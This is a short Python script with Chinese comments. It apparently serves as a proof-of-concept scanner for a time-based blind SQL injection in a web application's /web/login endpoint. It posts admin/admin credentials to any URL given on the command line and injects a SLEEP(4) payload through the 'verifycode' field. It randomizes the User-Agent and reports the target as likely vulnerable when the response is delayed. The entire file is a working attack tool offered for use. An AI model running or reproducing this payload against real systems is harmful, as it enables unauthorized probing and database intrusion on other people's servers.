import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/web/login',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/web/login"  # 移除末尾的斜杠
    else:
        url = args.url + "/web/login"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip'
}
data = {
    'user_name': 'admin',
    'password': "admin",
    'verifycode': "1' AND (SELECT 9821 FROM (SELECT (SLEEP(4))) dfpe) AND 'dYCM'='",
    'language': '0'
}

response = requests.post(url, headers=headers,data=data)
if 4 <= response.elapsed.total_seconds() < 8:
    print("目标url："+ url + '\n' +"可能存在该漏洞"+ '/n'+ '返回内容为' + response.text)
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)